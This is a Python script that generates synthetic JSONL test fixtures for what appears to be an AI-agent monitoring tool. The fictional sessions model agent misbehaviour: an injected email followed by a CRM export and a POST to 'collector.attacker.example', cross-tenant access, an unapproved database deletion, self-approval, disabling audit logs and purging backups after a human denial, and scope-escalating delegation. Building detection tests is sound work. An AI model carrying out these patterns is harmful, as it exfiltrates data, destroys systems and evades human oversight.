"""Regenerate the synthetic fixture files in this directory.

All identities, tenants, hosts, and data here are fictional. Run:

    python fixtures/generate_fixtures.py
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).parent
BASE = datetime(2026, 9, 1, 14, 0, 0, tzinfo=timezone.utc)


class Session:
    def __init__(self, session_id: str):
        self.session_id = session_id
        self.events: list[dict] = []
        self.t = BASE
        self.n = 0

    def add(self, event_type: str, seconds: int = 5, **attributes) -> str:
        self.t += timedelta(seconds=seconds)
        self.n += 1
        event_id = f"{self.session_id}-e{self.n:02d}"
        self.events.append(
            {
                "event_id": event_id,
                "timestamp": self.t.isoformat().replace("+00:00", "Z"),
                "session_id": self.session_id,
                "event_type": event_type,
                "attributes": attributes,
            }
        )
        return event_id

    def start(self, agent, workload, principal, tenant, scopes):
        return self.add(
            "session.start",
            seconds=0,
            **{
                "gen_ai.agent.id": agent,
                "gen_ai.operation.name": "invoke_agent",
                "agentwatch.workload.id": workload,
                "agentwatch.principal.id": principal,
                "agentwatch.tenant.id": tenant,
                "agentwatch.delegation.scopes": scopes,
            },
        )

    def call(self, agent, tool, call_id, action, workload=None, **extra):
        attrs = {
            "gen_ai.agent.id": agent,
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": tool,
            "gen_ai.tool.call.id": call_id,
            "agentwatch.tool.action_class": action,
        }
        if workload:
            attrs["agentwatch.workload.id"] = workload
        attrs.update({f"agentwatch.{k}": v for k, v in extra.items()})
        return self.add("tool.call", **attrs)

    def write(self, name: str, header: str) -> None:
        path = HERE / name
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(f"# {header}\n")
            for e in self.events:
                fh.write(json.dumps(e, sort_keys=True) + "\n")


def spiffe(name: str) -> str:
    return f"spiffe://example.test/agents/{name}"


def benign() -> None:
    s = Session("s-benign")
    s.start("research-agent", spiffe("research"), "user:alice", "tenant-acme", ["kb.read", "tickets.write"])
    s.call("research-agent", "kb_search", "c1", "read", spiffe("research"),
           **{"resource.uri": "vector://kb/acme/policies", "resource.tenant": "tenant-acme",
              "data.sensitivity": "internal", "tool.required_scope": "kb.read"})
    s.call("research-agent", "kb_search", "c2", "read", spiffe("research"),
           **{"resource.uri": "vector://kb/acme/runbooks", "resource.tenant": "tenant-acme",
              "data.sensitivity": "internal", "tool.required_scope": "kb.read"})
    s.call("research-agent", "create_ticket", "c3", "write", spiffe("research"),
           **{"resource.uri": "tickets://acme/SEC-1042", "resource.tenant": "tenant-acme",
              "tool.required_scope": "tickets.write"})
    s.write("benign_session.jsonl", "Benign: tenant-scoped retrieval and a scoped write. Expect zero findings.")


def indirect_injection_exfil() -> None:
    s = Session("s-inject")
    s.start("mail-assistant", spiffe("mail-assistant"), "user:bob", "tenant-acme",
            ["mail.read", "crm.read", "http.post"])
    s.add("content.ingest", **{"gen_ai.agent.id": "mail-assistant",
                               "agentwatch.provenance.trust": "untrusted",
                               "agentwatch.provenance.source": "inbound email from external sender"})
    s.call("mail-assistant", "crm_export_contacts", "c1", "read", spiffe("mail-assistant"),
           **{"resource.uri": "crm://acme/contacts", "resource.tenant": "tenant-acme",
              "data.sensitivity": "confidential", "tool.required_scope": "crm.read"})
    s.call("mail-assistant", "http_post", "c2", "egress", spiffe("mail-assistant"),
           **{"egress.destination": "collector.attacker.example", "tool.required_scope": "http.post"})
    s.write("indirect_injection_exfil.jsonl",
            "Untrusted email ingested, then confidential CRM read, then POST to an unknown host. Expect AW-003, AW-004.")


def cross_tenant() -> None:
    s = Session("s-tenant")
    s.start("support-agent", spiffe("support"), "user:carol", "tenant-acme", ["kb.read", "kb.write"])
    s.call("support-agent", "vector_query", "c1", "read", spiffe("support"),
           **{"resource.uri": "vector://kb/acme/faq", "resource.tenant": "tenant-acme",
              "tool.required_scope": "kb.read"})
    s.call("support-agent", "vector_query", "c2", "read", spiffe("support"),
           **{"resource.uri": "vector://kb/globex/contracts", "resource.tenant": "tenant-globex",
              "data.sensitivity": "confidential", "tool.required_scope": "kb.read"})
    s.call("support-agent", "vector_upsert", "c3", "write", spiffe("support"),
           **{"resource.uri": "vector://kb/globex/faq", "resource.tenant": "tenant-globex",
              "tool.required_scope": "kb.write"})
    s.write("cross_tenant_retrieval.jsonl",
            "Session bound to tenant-acme reads and writes tenant-globex vectors. Expect AW-001 (high, then critical).")


def unapproved_destructive() -> None:
    s = Session("s-destroy")
    s.start("ops-agent", spiffe("ops"), "user:dana", "tenant-acme",
            ["infra.read", "infra.admin", "audit.admin"])
    # 1) Human-approved deletion: must NOT fire AW-002.
    s.add("approval.granted", **{"gen_ai.tool.call.id": "c1", "agentwatch.approval.approver_id": "user:dana",
                                 "agentwatch.approval.approver_type": "human"})
    s.call("ops-agent", "delete_snapshot", "c1", "irreversible", spiffe("ops"),
           **{"resource.uri": "infra://acme/snapshots/old-1", "resource.tenant": "tenant-acme",
              "tool.required_scope": "infra.admin"})
    # 2) No approval at all.
    s.call("ops-agent", "delete_database", "c2", "irreversible", spiffe("ops"),
           **{"resource.uri": "infra://acme/db/orders", "resource.tenant": "tenant-acme",
              "tool.required_scope": "infra.admin"})
    # 3) Self-approval by the agent.
    s.add("approval.granted", **{"gen_ai.tool.call.id": "c3", "agentwatch.approval.approver_id": "ops-agent",
                                 "agentwatch.approval.approver_type": "agent"})
    s.call("ops-agent", "rotate_root_keys", "c3", "irreversible", spiffe("ops"),
           **{"resource.uri": "kms://acme/root", "resource.tenant": "tenant-acme",
              "tool.required_scope": "infra.admin"})
    # 4) Disable audit logging, then an irreversible purge (tampering sequence) after a denial.
    s.call("ops-agent", "set_audit_logging", "c4", "write", spiffe("ops"),
           **{"resource.uri": "audit://acme/trail", "resource.tenant": "tenant-acme",
              "tool.category": "security_control", "tool.required_scope": "audit.admin"})
    s.add("approval.denied", **{"gen_ai.tool.call.id": "c5", "agentwatch.approval.approver_id": "user:dana",
                                "agentwatch.approval.approver_type": "human"})
    s.call("ops-agent", "purge_backups", "c5", "irreversible", spiffe("ops"),
           **{"resource.uri": "infra://acme/backups", "resource.tenant": "tenant-acme",
              "tool.required_scope": "infra.admin"})
    s.write("unapproved_destructive_actions.jsonl",
            "One approved delete, one unapproved, one self-approved, one run after denial following audit tampering.")


def delegation_abuse() -> None:
    s = Session("s-delegate")
    s.start("orchestrator", spiffe("orchestrator"), "user:erin", "tenant-acme", ["crm.read", "mail.send"])
    s.add("agent.delegate", **{"agentwatch.delegation.parent_agent_id": "orchestrator",
                               "agentwatch.delegation.child_agent_id": "crm-worker",
                               "agentwatch.delegation.child_workload_id": spiffe("crm-worker"),
                               "agentwatch.delegation.scopes": ["crm.read", "crm.write"]})
    s.add("agent.delegate", **{"agentwatch.delegation.parent_agent_id": "crm-worker",
                               "agentwatch.delegation.child_agent_id": "enricher",
                               "agentwatch.delegation.child_workload_id": spiffe("enricher"),
                               "agentwatch.delegation.scopes": ["crm.read"]})
    s.add("agent.delegate", **{"agentwatch.delegation.parent_agent_id": "enricher",
                               "agentwatch.delegation.child_agent_id": "scraper",
                               "agentwatch.delegation.child_workload_id": spiffe("scraper"),
                               "agentwatch.delegation.scopes": ["crm.read"]})
    s.call("crm-worker", "crm_update", "c1", "write", spiffe("crm-worker"),
           **{"resource.uri": "crm://acme/accounts/77", "resource.tenant": "tenant-acme",
              "tool.required_scope": "crm.write"})
    s.call("enricher", "crm_read", "c2", "read", "spiffe://example.test/agents/unknown-runner",
           **{"resource.uri": "crm://acme/accounts/77", "resource.tenant": "tenant-acme",
              "tool.required_scope": "crm.read"})
    s.call("scraper", "mail_send", "c3", "write", spiffe("scraper"),
           **{"resource.uri": "mail://acme/outbound", "resource.tenant": "tenant-acme",
              "tool.required_scope": "mail.send"})
    s.call("ghost-agent", "crm_read", "c4", "read", spiffe("ghost"),
           **{"resource.uri": "crm://acme/accounts/78", "resource.tenant": "tenant-acme"})
    s.write("delegation_abuse.jsonl",
            "Scope escalation on delegation, deep chain, workload mismatch, out-of-scope tool, unbound agent.")


if __name__ == "__main__":
    benign()
    indirect_injection_exfil()
    cross_tenant()
    unapproved_destructive()
    delegation_abuse()
    print("fixtures written to", HERE)
